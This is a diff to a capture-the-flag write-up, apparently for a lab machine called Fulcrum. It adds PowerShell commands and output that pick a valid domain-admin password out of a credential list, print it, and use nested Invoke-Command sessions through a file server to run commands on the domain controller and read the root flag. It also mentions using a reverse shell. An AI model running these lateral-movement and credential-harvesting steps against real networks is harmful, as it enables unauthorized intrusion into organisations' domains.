@@ -245,10 +245,10 @@ They have machine names
 We do nslookup of those machine names on the Powershell machine and we can identify what machine is present on what IP
 
 
-| IP            | Machine               |
-| ------------- |:-------------:        |
-| 10.25.25.2    | DC (dc.fulcrum.local) |
-| 10.25.25.3    | DC (dc.fulcrum.local) |
+| IP            | Machine                   |
+| ------------- |:-------------------------:|
+| 10.25.25.2    | DC (dc.fulcrum.local)     |
+| 10.25.25.3    | FILE (file.fulcrum.local) |
 
 
 Lets have a network map handy so we dont confuse stuff
@@ -401,23 +401,53 @@ We can tail out the script into a new ps1 file and run it against the merged.txt
 [192.168.1.41]: PS C:\inetpub\wwwroot> Invoke-Command –Session $session –ScriptBlock {.\dotalol.ps1 ..\merged.txt}
 ...
 ...
-
-
+8c32 :: credentials invalid
+923a :: credentials valid
+a754 :: credentials invalid
 ...
 ...
+```
+
+Just grep out the line with that username aaaand
+```
+[192.168.1.41]: PS C:\inetpub\wwwroot> Invoke-Command –Session $session –ScriptBlock {sls 923a ..\merged.txt -ca | select -exp line}
+9f68,@fulcrum_df0923a7ca40_$
+923a,@fulcrum_bf392748ef4e_$
 ```
 
 We got domain admin creds!!! Say wuuuut !
 
+> Username : 923a | Password : @fulcrum_bf392748ef4e_$
+
 We try to use those creds from our PSSession but it gives an error
 ```
-Invoke-Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {whoami}
+[192.168.1.41]: PS C:\inetpub\wwwroot> Invoke-Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {whoami}
+[dc.fulcrum.local] Connecting to remote server dc.fulcrum.local failed with the following error message : The WinRM client cannot
+process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain,
+then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd
+to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information
+about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help
+topic.
+    + CategoryInfo          : OpenError: (dc.fulcrum.local:String) [], PSRemotingTransportException
+    + FullyQualifiedErrorId : ServerNotTrusted,PSSessionStateBroken
 ```
 
 Maybe we dont have direct access to the dc, we might have to route the Commands through the file.fulcrum.local
+It will ask for creds twice (Once for the file server and once for the dc) At both places we can enter 923a's creds as it is the domain admin
 
 ```
-Invoke-Command -ComputerName file.fulcrum.local -Credential $creds -ScriptBlock {Invoke-Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {whoami}}
-
-Invoke-Command -ComputerName File.fulcrum.local -Credential $creds -ScriptBlock {Invoke-Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {type ../../Administrator/Desktop/root.txt}}
+[192.168.1.41]: PS C:\inetpub\wwwroot> Invoke-Command -ComputerName file.fulcrum.local -Credential $creds -ScriptBlock {Invoke-Command
+ -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {whoami}}
+fulcrum\923a
 ```
+We can invoke a reverse shell from the dc from port 53 however getting the root.txt with command execution should also be just fine! 
+
+Time to get root.txt!! :grin:
+
+```
+[192.168.1.41]: PS C:\inetpub\wwwroot> Invoke-Command -ComputerName File.fulcrum.local -Credential $creds -ScriptBlock {Invoke-Command
+ -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {type ../../Administrator/Desktop/root.txt}}
+8ddbe372e57c019bb6c4cdb5b35a0cab
+```
+
+<kbd><img src="https://media.giphy.com/media/FA77mwaxV74SA/giphy.gif"></kbd>
